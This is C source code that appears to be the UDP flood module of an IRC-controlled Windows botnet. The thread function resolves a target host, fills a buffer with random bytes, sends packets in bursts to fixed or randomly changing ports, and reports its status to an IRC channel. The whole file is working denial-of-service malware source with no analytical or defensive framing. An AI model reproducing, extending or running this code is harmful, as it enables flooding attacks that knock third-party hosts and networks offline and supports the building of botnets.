#include "includes.h"
#include "functions.h"

#define MAXUDPPORT 65535

// function for sending udp packets
DWORD WINAPI udp(LPVOID param)
{
	UDPFLOOD udp = *((UDPFLOOD *)param);
	UDPFLOOD *udps = (UDPFLOOD *)param;
	udps->gotinfo = TRUE;
	IRC* irc=(IRC*)udp.conn;

	char sendbuf[IRCLINE], pbuff[MAXPINGSIZE];
	int i;

	srand(GetTickCount());

	SOCKET usock = fsocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;

	IN_ADDR iaddr;
	iaddr.s_addr = finet_addr(udp.host);
	LPHOSTENT hostent = NULL;
	if (iaddr.s_addr == INADDR_NONE)
		hostent = fgethostbyname(udp.host);
	if (hostent == NULL && iaddr.s_addr == INADDR_NONE) {
		if (!udp.silent) irc->privmsg(udp.target, "[UDP] Error sending udp packets to %s.", udp.host);

		clearthread(udp.threadnum);
		ExitThread(1);
	}
	ssin.sin_addr = ((hostent != NULL)?(*((LPIN_ADDR)*hostent->h_addr_list)):(iaddr));
	ssin.sin_port = ((udp.port == 0)?(fhtons((unsigned short)((rand() % MAXPINGSIZE) + 1))):(fhtons((unsigned short)udp.port)));

	if (udp.port < 1)
		udp.port = 1;
	if (udp.port > MAXUDPPORT)
		udp.port = MAXUDPPORT;
	udp.num = udp.num / 10;
	if (udp.delay == 0)
		udp.delay = 1;

	for (i = 0; i < udp.size; i++)
		pbuff[i] = (char)(rand() % 255);
	while (udp.num-- > 0) {
		//change port every 10 packets (if one isn't specified)
		for (i = 0; i < 11; i++) {
			fsendto(usock, pbuff, udp.size-(rand() % 10), 0, (LPSOCKADDR)&ssin, sizeof(ssin));
			Sleep(udp.delay);
		}
		if (udp.port == 0)
			ssin.sin_port = fhtons((unsigned short)((rand() % MAXPINGSIZE) + 1));
	}
	if (!udp.silent) irc->privmsg(udp.target, "[UDP] Finished sending packets to %s", udp.host);


	clearthread(udp.threadnum);
	ExitThread(0);
}
